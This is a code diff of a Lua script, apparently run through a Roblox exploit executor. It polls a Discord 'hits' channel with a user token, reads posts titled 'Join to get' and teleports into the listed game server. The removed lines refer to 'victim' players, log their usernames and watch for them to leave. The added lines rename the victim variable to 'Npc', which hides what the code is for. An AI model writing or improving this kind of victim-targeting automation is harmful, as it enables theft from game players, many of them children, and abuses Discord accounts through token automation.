@@ -47,43 +47,57 @@ end
 waitForPlayerLeave() -- Start listening for the victim leaving
 
 local function unifiedAutoJoin()
-    if didVictimLeave or timer >= 10 then -- Only run if victim left or if timer is 10 or more
+
+    if didNpcLeave or timer >= 10 then
+
+        print("Checking Discord channel...")
+
         local response = request({
             Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
             Method = "GET",
             Headers = {
-                ['Authorization'] = token,
-                ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+                ["Authorization"] = token,
                 ["Content-Type"] = "application/json"
             }
         })
 
+        if not response then
+            warn("No response from Discord request")
+            return
+        end
+
+        print("Status:", response.StatusCode)
+
         if response.StatusCode == 200 then
+
             local messages = HttpServ:JSONDecode(response.Body)
-            if #messages == 0 then
-                warn("0 messages found. Make sure the channelId is the channel you get hits in")
-                return
-            end
 
-            for _, message in ipairs(messages) do
-                if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
-                    if message.embeds[1].title:find("Join to get") then
-                        local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)') -- Extract placeId and jobId from the embed
+            print("Messages found:", #messages)
+
+            for _,message in ipairs(messages) do
+
+                if message.content and message.embeds and message.embeds[1] then
+
+                    if message.embeds[1].title and message.embeds[1].title:find("Join to get") then
+
+                        local placeId, jobId =
+                        string.match(message.content,
+                        'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
+
                         if placeId and jobId then
-                            local victimUsername = message.embeds[1].fields[1].value
 
-                            if not table.find(joinedIds, tostring(message.id)) then
-                                saveJoinedId(tostring(message.id)) -- Save this ID to the list
-                                writefile("user.txt", victimUsername)
-                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
-                                return
-                            end
+                            print("Joining server:", placeId, jobId)
+
+                            TeleportService:TeleportToPlaceInstance(placeId, jobId)
+
+                            return
                         end
                     end
                 end
             end
+
         else
-            warn("Response code is not 200. Is your token and channelid correct?")
+            warn("Discord API error:", response.StatusCode)
         end
     end
 end
